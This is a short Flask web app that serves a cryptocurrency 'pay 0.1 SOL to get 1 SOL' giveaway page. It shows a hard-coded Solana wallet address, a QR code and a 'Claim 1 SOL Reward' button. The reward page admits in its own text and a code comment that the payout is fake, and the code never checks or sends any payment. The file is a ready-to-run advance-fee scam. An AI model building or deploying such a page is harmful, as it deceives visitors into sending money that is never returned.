from flask import Flask

app = Flask(__name__)

DONATION_WALLET = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

@app.route("/")
def home():
    html = f"""
    <html>
    <head>
      <title>Pay 0.1 SOL to Get 1 SOL</title>
      <style>
        body {{
          background-color: black;
          color: white;
          font-family: Arial, sans-serif;
          text-align: center;
          padding: 2rem;
        }}
        h1 {{
          color: #00FF00;
        }}
        .qr-code img {{
          width: 300px;
          height: 300px;
          border: 4px solid #00FF00;
          border-radius: 16px;
        }}
        a.button {{
          display: inline-block;
          margin-top: 20px;
          padding: 15px 25px;
          background: #00FF00;
          color: black;
          font-weight: bold;
          text-decoration: none;
          border-radius: 8px;
          font-size: 18px;
        }}
        code {{
          background-color: #111;
          padding: 4px 8px;
          border-radius: 6px;
          font-size: 1.2rem;
        }}
      </style>
    </head>
    <body>
      <h1>Pay 0.1 SOL to this wallet</h1>
      <p>Wallet: <code>{DONATION_WALLET}</code></p>
      <div class="qr-code">
        <img src="{QR_CODE_URL}" alt="Solana Pay QR Code" />
      </div>
      <p>After payment, click the button below to get your reward:</p>
      <a href="/verify" class="button">Claim 1 SOL Reward</a>
    </body>
    </html>
    """
    return html


@app.route("/verify")
def verify():
    # This is a placeholder for where you'd check payment status or simulate the "fake" 1 SOL reward
    html = f"""
    <html>
    <head>
      <title>Reward Claimed</title>
      <style>
        body {{
          background-color: black;
          color: #00FF00;
          font-family: Arial, sans-serif;
          text-align: center;
          padding: 3rem;
        }}
        a {{
          color: #00FF00;
          text-decoration: none;
          font-weight: bold;
        }}
      </style>
    </head>
    <body>
      <h1>🎉 Reward Claimed!</h1>
      <p>You have “received” 1 SOL (fake reward).</p>
      <p>Thank you for participating.</p>
      <p><a href="/">Back to Home</a></p>
    </body>
    </html>
    """
    return html


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
